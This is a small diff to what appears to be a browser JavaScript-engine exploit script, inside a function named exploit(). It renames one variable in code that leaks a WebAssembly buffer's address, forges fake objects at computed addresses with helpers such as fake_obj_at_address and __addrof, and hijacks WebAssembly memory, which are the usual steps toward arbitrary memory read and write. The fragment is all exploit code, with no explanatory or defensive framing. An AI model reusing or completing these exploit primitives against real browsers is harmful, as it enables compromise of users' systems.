@@ -346,8 +346,8 @@ function exploit(){
             fail("[+] Got A NAN address which invalid reloading");
         }
         log('[+] Got WebAssembly buffer at 0x'+wasmBufferRawAddr.toString(16));
-        let h = new Int64(wasmBufferRawAddr).toString()[9];
-        var fakeWasmBuffer = fake_obj_at_address(wasmBufferRawAddr+16,parseInt(h));
+        let u = new Int64(wasmBufferRawAddr).toString()[9];
+        var fakeWasmBuffer = fake_obj_at_address(wasmBufferRawAddr+16,parseInt(u));
         var maxtry = 0;
         if (!(fakeWasmBuffer instanceof WebAssembly.Memory)) {
         while (!(fakeWasmBuffer instanceof WebAssembly.Memory)) {
@@ -363,7 +363,7 @@ function exploit(){
     }
         
         var wasmMemRawAddr = __addrof(wasmInternalMemory);
-        var wasmMem = fake_obj_at_address2(wasmMemRawAddr+16,parseInt(h));    
+        var wasmMem = fake_obj_at_address2(wasmMemRawAddr+16,parseInt(u));    
         
         wasmBuffer.memory = wasmMem;
         
